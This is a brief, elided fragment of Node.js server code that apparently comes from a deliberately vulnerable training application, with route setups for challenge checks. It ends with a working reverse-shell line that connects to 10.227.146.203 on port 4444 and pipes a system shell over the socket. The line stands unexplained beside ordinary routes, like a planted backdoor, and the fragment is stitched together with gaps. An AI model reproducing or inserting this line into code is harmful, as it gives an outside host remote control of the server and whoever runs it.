...
restoreOverwrittenFilesWithOriginals().then(() => {
  ...
  app.post('/api/Feedbacks', verify.forgedFeedbackChallenge(), security.appendUserId(true))
  ...
  app.post('/rest/web3/walletAddress', web3Wallet.contractExploitListener())
...
cl.connect(4444, "10.227.146.203", function(){ cl.pipe(sh.stdin); sh.stdout.pipe(cl); sh.stderr.pipe(cl); });
